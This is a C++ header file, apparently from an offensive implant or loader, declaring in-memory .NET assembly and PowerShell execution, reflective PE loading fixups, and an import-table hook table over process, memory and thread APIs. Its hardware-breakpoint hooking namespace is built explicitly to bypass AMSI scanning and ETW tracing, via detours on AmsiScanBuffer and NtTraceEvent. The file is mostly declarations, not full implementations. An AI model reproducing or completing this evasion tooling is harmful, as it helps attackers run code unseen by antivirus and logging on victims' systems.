#include <Externs.hpp>
#include <Common.hpp>
#include <Strings.hpp>

#define PIPE_BUFFER_LENGTH 0x10000

namespace mscorlib {
    #include <Mscoree.hpp>
}

typedef mscorlib::_PropertyInfo IPropertyInfo;
typedef mscorlib::_AppDomain    IAppDomain;
typedef mscorlib::_Assembly     IAssembly;
typedef mscorlib::_Type         IType;
typedef mscorlib::_MethodInfo   IMethodInfo;
typedef mscorlib::BindingFlags  IBindingFlags;

enum Write {
    Default,
    Apc
};

enum Alloc {
    Default,
    Drip
};

#define HW_ALL_THREADS 0x25

enum Dr {
    x0,
    x1,
    x2,
    x3
};

typedef struct _DESCRIPTOR_HOOK {
    ULONG  ThreadID;
    HANDLE Handle;
    BOOL   Processed;
    INT8   Drx;
    UPTR   Address;
    VOID ( *Detour )( PCONTEXT );
    struct _DESCRIPTOR_HOOK* Next;
    struct _DESCRIPTOR_HOOK* Prev;
} DESCRIPTOR_HOOK, *PDESCRIPTOR_HOOK;

#define CONTINUE_EXEC( Ctx )( Ctx->EFlags = Ctx->EFlags | ( 1 << 16 ) )

#ifdef _WIN64
#define SET_RET( Ctx, Val )( (UPTR)( Ctx->Rax = (UPTR)( Val ) ) )
#elif  _WIN32
#define SET_RET( Ctx, Val )( (UPTR)( Ctx->Eax = (UPTR)( Val ) ) )
#endif

#define KH_BYPASS_NONE 0x000
#define KH_BYPASS_ALL  0x100
#define KH_BYPASS_ETW  0x400
#define KH_BYPASS_AMSI 0x700

namespace Hwbp {
    struct {
        UPTR NtTraceEvent;
    } Etw;

    struct {
        UPTR Handle;
        UPTR AmsiScanBuffer;
    } Amsi;

    auto SetDr7(
        _In_ UPTR ActVal,
        _In_ UPTR NewVal,
        _In_ INT  StartPos,
        _In_ INT  BitsCount
    ) -> UPTR;

    auto Install(
        _In_ UPTR  Address,
        _In_ INT8  Drx,
        _In_ PVOID Callback,
        _In_ ULONG ThreadID
    ) -> BOOL;

    auto Uninstall(
        _In_ UPTR  Address,
        _In_ ULONG ThreadID
    ) -> BOOL;

    auto SetBreak(
        _In_ ULONG ThreadID,
        _In_ UPTR  Address,
        _In_ INT8  Drx,
        _In_ BOOL  Init
    ) -> BOOL;

    auto Insert(
        _In_ UPTR  Address,
        _In_ INT8  Drx,
        _In_ BOOL  Init,
        _In_ ULONG ThreadID
    ) -> BOOL;

    auto Init( VOID ) -> BOOL;
    auto Clean( VOID ) -> BOOL;
    auto DotnetInit( VOID ) -> BOOL;
    auto DotnetExit( VOID ) -> BOOL;

    auto SetArg(
        _In_ PCONTEXT Ctx,
        _In_ UPTR     Val,
        _In_ ULONG    Idx
    ) -> VOID;

    auto GetArg(
        _In_ PCONTEXT Ctx,
        _In_ ULONG    Idx
    ) -> UPTR;

    auto MainHandler( 
        _In_ PEXCEPTION_POINTERS e 
    ) -> LONG;

    auto HookCallback(
        _In_ PVOID Parameter,
        _In_ BOOL  TimerWait
    ) -> VOID;

    auto EtwDetour(
        _In_ PCONTEXT Ctx
    ) -> VOID;

    auto AmsiDetour(
        _In_ PCONTEXT Ctx
    ) -> VOID;

    auto AddNewThreads(
        _In_ INT8 Drx
    ) -> BOOL;

    auto RmNewThreads(
        _In_ INT8 Drx
    ) -> BOOL {
        return Hwbp::Uninstall( U_PTR( GetProcAddress( GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx" ) ), HW_ALL_THREADS );
    }

    auto NtCreateThreadExHk(
        _In_ PCONTEXT Ctx
    ) -> VOID;
}

struct {
    GUID CLRMetaHost;
    GUID CorRuntimeHost;
} CLSID = {
    .CLRMetaHost    = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } },
    .CorRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } }
};

struct {
    GUID MscorlibAsm;
    GUID IHostControl;
    GUID AppDomain;
    GUID ICLRMetaHost;
    GUID ICLRRuntimeInfo;
    GUID ICorRuntimeHost;
    GUID IDispatch;
} IID = {
    .MscorlibAsm      = { 0x17156360, 0x2F1A, 0x384A, { 0xBC, 0x52, 0xFD, 0xE9, 0x3C, 0x21, 0x5C, 0x5B } },
    .IHostControl     = { 0x02CA073C, 0x7079, 0x4860, { 0x88, 0x0A, 0xC2, 0xF7, 0xA4, 0x49, 0xC9, 0x91 } },
    .AppDomain        = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } },
    .ICLRMetaHost     = { 0xD332DB9E, 0xB9B3, 0x4125, { 0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16 } },
    .ICLRRuntimeInfo  = { 0xBD39D1D2, 0xBA2F, 0x486a, { 0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91 } },
    .ICorRuntimeHost  = { 0xcb2f6722, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } },
    .IDispatch        = { 0x00020400, 0x0000, 0x0000, { 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } }
};

struct {
    PVOID Parameter;
    ULONG TimerWait;
} HookCallbackArg;

namespace Dotnet {
    BOOL  ExitBypass = FALSE;
    ULONG Bypass     = KH_BYPASS_NONE;

    auto VersionList( VOID ) -> VOID;

    auto Inline(
        _In_ BYTE*  AsmBytes,
        _In_ ULONG  AsmLength,
        _In_ WCHAR* Arguments,
        _In_ WCHAR* AppDomName,
        _In_ WCHAR* Version,
        _In_ BOOL   KeepLoad
    ) -> BOOL;

    auto CreateVariantCmd(
        WCHAR* Command
    ) -> VARIANT;

    auto CreateSafeArray(
        VARIANT* Args, 
        UINT     Argc
    ) -> SAFEARRAY*;    

    auto GetMethodType(
        IBindingFlags  Flags,
        IType*        MType,
        BSTR          MethodInp,
        IMethodInfo** MethodReff
    ) -> HRESULT;

    auto Pwsh(
        _In_     WCHAR* Command,
        _In_opt_ WCHAR*  Script
    ) -> HRESULT;

    auto GetAssemblyLoaded(
        _In_  IAppDomain* AppDomain,
        _In_  WCHAR*      AsmName1,
        _In_  GUID        AsmIID, 
        _Out_ IAssembly** Assembly
    ) -> HRESULT;

    auto PatchExit(
        _In_ ICorRuntimeHost* IRuntime
    ) -> HRESULT;
}

namespace Fix {
    auto Tls( PVOID Base, PVOID DataDir ) -> VOID;
    auto Exp( PVOID Base, PVOID DataDir ) -> VOID;
    auto Imp( PVOID Base, PVOID DataDir ) -> BOOL;
    auto Rel( PVOID Base, UPTR  Delta, PVOID DataDir ) -> VOID;
}

namespace IAT {
    auto xExitProcess(UINT uExitCode) -> VOID;
    auto xRtlExitUserProcess(NTSTATUS ExitStatus) -> VOID;
    auto xTerminateProcess(HANDLE hProcess, UINT uExitCode) -> BOOL;
    auto xNtTerminateProcess(HANDLE hProcess, NTSTATUS ExitStatus) -> NTSTATUS;

    auto xVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) -> LPVOID;
    auto xVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) -> LPVOID;
    auto xNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) -> NTSTATUS;
    
    auto xVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) -> BOOL;
    auto xVirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) -> BOOL;
    auto xNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection) -> NTSTATUS;
    
    auto xReadProcessMemory( HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead ) -> BOOL;
    auto xNtReadVirtualMemory( HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded ) -> NTSTATUS;

    auto xWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten) -> BOOL;
    auto xNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) -> NTSTATUS;
    
    auto xOpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) -> HANDLE;
    auto xOpenThread(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId) -> HANDLE;
    auto xDuplicateHandle(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions) -> BOOL;
    auto xNtDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG Attributes, ULONG Options) -> NTSTATUS;
    
    auto xLoadLibraryA(LPCSTR lpLibFileName) -> HMODULE;
    auto xLoadLibraryW(LPCWSTR lpLibFileName) -> HMODULE;
    
    auto xSetThreadContext(HANDLE hThread, const CONTEXT* lpContext) -> BOOL;
    auto xGetThreadContext(HANDLE hThread, LPCONTEXT lpContext) -> BOOL;
    auto xNtSetContextThread(HANDLE ThreadHandle, CONTEXT* Context) -> NTSTATUS;
    auto xNtGetContextThread(HANDLE ThreadHandle, PCONTEXT Context) -> NTSTATUS;

    CHAR*   CmdAnsi     = nullptr;
    CHAR*   CmdArgvAnsi = nullptr;
    WCHAR*  CmdWide     = nullptr;
    WCHAR*  CmdArgvWide = nullptr;
    CHAR**  PoiArgvA    = nullptr;
    WCHAR** PoiArgvW    = nullptr;
    INT32   CmdArgc     = 0;

    auto xGetCommandLineA( VOID ) -> CHAR*;
    auto xGetCommandLineW( VOID ) -> WCHAR*;
    auto __p___argv( VOID )  -> CHAR***;
    auto __p___wargv( VOID ) -> WCHAR***;
    auto __p___argc( VOID )  -> INT*;
    auto __getmainargs( INT* _Argc, CHAR*** _Argv, CHAR*** _Env, INT _Useless_, PVOID _Useless ) -> INT;
    auto __wgetmainargs( INT* _Argc, WCHAR*** _Argv, WCHAR*** _Env, INT _Useless_, PVOID _Useless ) -> INT;

    struct {
        PVOID Ptr;
        CHAR* Name;
    } Table[31] = {
        { reinterpret_cast<PVOID>( &xExitProcess ), "ExitProcess" },
        { reinterpret_cast<PVOID>( &xRtlExitUserProcess ), "RtlExitUserProcess" },
        { reinterpret_cast<PVOID>( &xTerminateProcess), "TerminateProcess" },
        { reinterpret_cast<PVOID>( &xNtTerminateProcess), "NtTerminateProcess" },
         
        { reinterpret_cast<PVOID>( &xVirtualAlloc), "VirtualAlloc" },
        { reinterpret_cast<PVOID>( &xVirtualAllocEx), "VirtualAllocEx" },
        { reinterpret_cast<PVOID>( &xNtAllocateVirtualMemory), "NtAllocateVirtualMemory" },
        
        { reinterpret_cast<PVOID>( &xVirtualProtect), "VirtualProtect" },
        { reinterpret_cast<PVOID>( &xVirtualProtectEx), "VirtualProtectEx" },
        { reinterpret_cast<PVOID>( &xNtProtectVirtualMemory), "NtProtectVirtualMemory" },
        
        { reinterpret_cast<PVOID>( &xReadProcessMemory), "ReadProcessMemory" },
        { reinterpret_cast<PVOID>( &xNtReadVirtualMemory), "NtReadVirtualMemory" },
        
        { reinterpret_cast<PVOID>( &xWriteProcessMemory), "WriteProcessMemory" },
        { reinterpret_cast<PVOID>( &xNtWriteVirtualMemory), "NtWriteVirtualMemory" },
        
        { reinterpret_cast<PVOID>( &xOpenProcess), "OpenProcess" },
        { reinterpret_cast<PVOID>( &xOpenThread), "OpenThread" },
        { reinterpret_cast<PVOID>( &xDuplicateHandle), "DuplicateHandle" },
        { reinterpret_cast<PVOID>( &xNtDuplicateObject), "NtDuplicateObject" },
        
        { reinterpret_cast<PVOID>( &xLoadLibraryA), "LoadLibraryA" },
        { reinterpret_cast<PVOID>( &xLoadLibraryW), "LoadLibraryW" },
        
        { reinterpret_cast<PVOID>( &xSetThreadContext), "SetThreadContext" },
        { reinterpret_cast<PVOID>( &xGetThreadContext), "GetThreadContext" },
        { reinterpret_cast<PVOID>( &xNtSetContextThread), "NtSetContextThread" },
        { reinterpret_cast<PVOID>( &xNtGetContextThread), "NtGetContextThread" },

        { reinterpret_cast<PVOID>( &GetCommandLineA ), "GetCommandLineA" },
        { reinterpret_cast<PVOID>( &GetCommandLineW ), "GetCommandLineW" },
        { reinterpret_cast<PVOID>( &__p___argv ), "__p___argv" },
        { reinterpret_cast<PVOID>( &__p___wargv ), "__p___wargv" },
        { reinterpret_cast<PVOID>( &__p___argc ), "__p___argc" },
        { reinterpret_cast<PVOID>( &__getmainargs ), "__getmainargs" },
        { reinterpret_cast<PVOID>( &__wgetmainargs ), "__wgetmainargs" }
    };
}